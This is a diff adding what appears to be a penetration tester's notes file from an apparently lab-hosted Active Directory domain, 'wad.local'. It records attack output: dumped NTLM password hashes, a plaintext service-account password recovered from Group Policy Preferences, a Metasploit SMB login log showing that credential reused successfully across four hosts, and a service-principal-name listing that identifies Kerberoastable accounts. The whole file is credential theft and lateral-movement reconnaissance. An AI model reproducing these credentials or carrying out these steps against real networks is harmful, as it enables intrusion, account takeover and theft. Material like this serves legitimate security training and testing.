@@ -1,0 +1,124 @@
+/hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:e89aa5264c5da7e343276524d47d36b3:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:96bdef939a6156e7c8d423e49bc29d20:::
+julien:1001:aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86:::
+
+/cache 
+
+Username,Hash,Hash iteration count,Logon Domain Name,DNS Domain Name,Last Login,UPN,Effective Name,Full Name,Logon Script,Profile Path,Home Directory,HomeDir Drive,Primary Group,Additional Groups
+
+/gpp 
+ Name               Value
+ ----               -----
+ TYPE               ScheduledTasks.xml
+ USERNAME           svc_sched
+ PASSWORD           K33pAlive4ever
+ DOMAIN CONTROLLER  WAD-DC01.WAD.LOCAL
+ DOMAIN             wad.local
+ CHANGED            2019-19-03 09:30:00
+ TASK               C:\Windows\System32\cmd.exe
+ NAME               SchedTask
+
+/smb login 
+[*] 10.13.37.20:445       - 10.13.37.20:445 - Starting SMB login bruteforce
+[+] 10.13.37.20:445       - 10.13.37.20:445 - Success: 'wad.local\svc_sched:K33pAlive4ever'
+[*] Scanned 1 of 4 hosts (25% complete)
+[*] 10.13.37.12:445       - 10.13.37.12:445 - Starting SMB login bruteforce
+[+] 10.13.37.12:445       - 10.13.37.12:445 - Success: 'wad.local\svc_sched:K33pAlive4ever'
+[*] Scanned 2 of 4 hosts (50% complete)
+[*] 10.13.37.10:445       - 10.13.37.10:445 - Starting SMB login bruteforce
+[+] 10.13.37.10:445       - 10.13.37.10:445 - Success: 'wad.local\svc_sched:K33pAlive4ever'
+[*] Scanned 3 of 4 hosts (75% complete)
+[*] 10.13.37.11:445       - 10.13.37.11:445 - Starting SMB login bruteforce
+[+] 10.13.37.11:445       - 10.13.37.11:445 - Success: 'wad.local\svc_sched:K33pAlive4ever'
+[*] Scanned 4 of 4 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+/SPN 
+setspn -T wad.local -Q */*
+Checking domain DC=wad,DC=local
+CN=WAD-DC01,OU=Domain Controllers,DC=wad,DC=local
+	TERMSRV/WAD-DC01
+	TERMSRV/wad-dc01.wad.local
+	Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/wad-dc01.wad.local
+	ldap/wad-dc01.wad.local/ForestDnsZones.wad.local
+	ldap/wad-dc01.wad.local/DomainDnsZones.wad.local
+	DNS/wad-dc01.wad.local
+	GC/wad-dc01.wad.local/wad.local
+	RestrictedKrbHost/wad-dc01.wad.local
+	RestrictedKrbHost/WAD-DC01
+	RPC/40f965a5-aac7-4e60-ba40-585faab16aa8._msdcs.wad.local
+	HOST/WAD-DC01/WAD
+	HOST/wad-dc01.wad.local/WAD
+	HOST/WAD-DC01
+	HOST/wad-dc01.wad.local
+	HOST/wad-dc01.wad.local/wad.local
+	E3514235-4B06-11D1-AB04-00C04FC2DCD2/40f965a5-aac7-4e60-ba40-585faab16aa8/wad.local
+	ldap/WAD-DC01/WAD
+	ldap/40f965a5-aac7-4e60-ba40-585faab16aa8._msdcs.wad.local
+	ldap/wad-dc01.wad.local/WAD
+	ldap/WAD-DC01
+	ldap/wad-dc01.wad.local
+	ldap/wad-dc01.wad.local/wad.local
+CN=krbtgt,CN=Users,DC=wad,DC=local
+	kadmin/changepw
+CN=svc_sql,CN=Users,DC=wad,DC=local
+	MSSQLSvc/WAD-SQL01.WAD.local:1433
+CN=WAD-SQL01,CN=Computers,DC=wad,DC=local
+	WSMAN/wad-sql01
+	WSMAN/wad-sql01.wad.local
+	TERMSRV/WAD-SQL01
+	TERMSRV/wad-sql01.wad.local
+	RestrictedKrbHost/WAD-SQL01
+	HOST/WAD-SQL01
+	RestrictedKrbHost/wad-sql01.wad.local
+	HOST/wad-sql01.wad.local
+CN=WAD-WEB01,CN=Computers,DC=wad,DC=local
+	TERMSRV/WAD-WEB01
+	TERMSRV/wad-web01.wad.local
+	WSMAN/wad-web01
+	WSMAN/wad-web01.wad.local
+	RestrictedKrbHost/WAD-WEB01
+	HOST/WAD-WEB01
+	RestrictedKrbHost/wad-web01.wad.local
+	HOST/wad-web01.wad.local
+CN=DESKTOP-MAIEURS,CN=Computers,DC=wad,DC=local
+	WSMAN/DESKTOP-MAIEURS
+	WSMAN/DESKTOP-MAIEURS.wad.local
+	TERMSRV/DESKTOP-MAIEURS
+	TERMSRV/DESKTOP-MAIEURS.wad.local
+	RestrictedKrbHost/DESKTOP-MAIEURS.wad.local
+	HOST/DESKTOP-MAIEURS.wad.local
+	RestrictedKrbHost/DESKTOP-MAIEURS
+	HOST/DESKTOP-MAIEURS
+CN=DESKTOP-LPEWTDC,CN=Computers,DC=wad,DC=local
+	WSMAN/DESKTOP-LPEWTDC.wad.local
+	TERMSRV/DESKTOP-LPEWTDC.wad.local
+	RestrictedKrbHost/DESKTOP-LPEWTDC.wad.local
+	HOST/DESKTOP-LPEWTDC.wad.local
+	WSMAN/DESKTOP-LPEWTDC
+	TERMSRV/DESKTOP-LPEWTDC
+	RestrictedKrbHost/DESKTOP-LPEWTDC
+	HOST/DESKTOP-LPEWTDC
+CN=DESKTOP-HXTPCVD,CN=Computers,DC=wad,DC=local
+	WSMAN/DESKTOP-HXTPCVD
+	WSMAN/DESKTOP-HXTPCVD.wad.local
+	TERMSRV/DESKTOP-HXTPCVD
+	TERMSRV/DESKTOP-HXTPCVD.wad.local
+	RestrictedKrbHost/DESKTOP-HXTPCVD.wad.local
+	HOST/DESKTOP-HXTPCVD.wad.local
+	RestrictedKrbHost/DESKTOP-HXTPCVD
+	HOST/DESKTOP-HXTPCVD
+CN=DESKTOP-FLMWEYO,CN=Computers,DC=wad,DC=local
+	WSMAN/DESKTOP-FLMWEYO
+	WSMAN/DESKTOP-FLMWEYO.wad.local
+	TERMSRV/DESKTOP-FLMWEYO
+	TERMSRV/DESKTOP-FLMWEYO.wad.local
+	RestrictedKrbHost/DESKTOP-FLMWEYO.wad.local
+	HOST/DESKTOP-FLMWEYO.wad.local
+	RestrictedKrbHost/DESKTOP-FLMWEYO
+	HOST/DESKTOP-FLMWEYO
+
+
